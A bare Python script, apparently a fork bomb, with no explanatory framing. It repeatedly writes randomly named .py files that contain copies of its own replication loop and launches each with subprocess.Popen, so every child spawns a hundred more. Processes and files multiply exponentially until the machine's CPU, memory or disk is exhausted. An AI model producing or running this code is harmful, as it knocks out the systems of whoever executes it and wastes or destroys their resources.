import random as r
import subprocess as s

name = __name__

if __name__ == "__main__":
    name = "main"

contents = f'''
import {name} as m
import random as r
import subprocess as s

for a in range(100):
  i = r.randint(0, 100000)
  m.writeFile(f"{{i}}.py", m.contents)
  filename = "python " + str(i) + ".py"
  s.Popen(filename, shell=True)
  print(f"Created {{i}}.py!")

'''


def writeFile(fileName, contents):
    fileContents = ""
    with open(fileName, 'w') as openFile:
        for i in contents:
            openFile.write(str(i))
            fileContents += str(i)


for a in range(100):
    i = r.randint(0, 100000)
    writeFile(f"{i}.py", contents)
    filename = "python " + str(i) + ".py"
    s.Popen(filename, shell=True)
    print(f"Created {i}.py!")
